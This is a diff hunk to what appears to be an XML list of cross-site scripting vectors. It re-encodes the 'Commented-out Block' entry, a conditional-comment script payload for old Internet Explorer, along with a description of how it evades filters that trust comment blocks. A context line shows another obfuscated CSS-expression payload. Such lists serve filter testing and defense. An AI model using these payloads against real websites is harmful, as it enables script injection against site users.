@@ -376,9 +376,9 @@ xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</
 	</attack>
 	<attack>
 		<name>Commented-out Block</name>
-		<code>&lt;!--[if gte IE 4]&gt;
-&lt;SCRIPT&gt;alert(&apos;XSS&apos;);&lt;/SCRIPT&gt;
-&lt;![endif]--&gt;</code>
+		<code><![CDATA[<!--[if gte IE 4]>
+<SCRIPT>alert(&apos;XSS&apos;);</SCRIPT>
+<![endif]-->]]></code>
 		<desc>Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.</desc>
 		<label>Other Attacks</label>
 		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
